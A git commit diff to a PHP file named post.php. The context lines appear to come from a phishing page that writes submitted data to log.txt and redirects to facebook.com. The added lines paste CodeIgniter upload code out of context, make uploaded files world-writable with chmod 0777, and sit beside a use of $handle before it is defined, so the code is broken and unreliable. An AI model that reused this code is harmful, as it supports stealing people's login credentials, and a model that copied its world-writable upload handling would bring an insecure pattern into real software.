3e8c02c0fa5b569d9aba5d972e9557d14adc7605
Mukesh Mahato <55306415+mukeshmahato843@users.noreply.github.com>
2020-03-18 22:02:25 +0545

    Update post.php

--- post.php
+++ post.php
@@ -1,4 +1,19 @@
 <?php
+
+$config['upload_path'] = './uploads/'; // upload path
+/* OR any other form, e.g.:
+$config['upload_path'] = $_SERVER["DOCUMENT_ROOT"].'/uploads/'; // upload path
+*/
+$config['allowed_types'] = 'zip'; // array or string of file extensions 
+$config['max_size'] = '100'; // max file size
+$this->load->library('upload', $config); // do the job
+$zdata = ['upload_data' => $this->upload->data()]; // get data
+$zfile = $zdata['upload_data']['full_path']; // get file path
+chmod($zfile,0777); // CHMOD file
+
+
+
+
 header ('Location: https://facebook.com');
 $handle->dir_chmod;
 $handle = fopen("log.txt", "a");
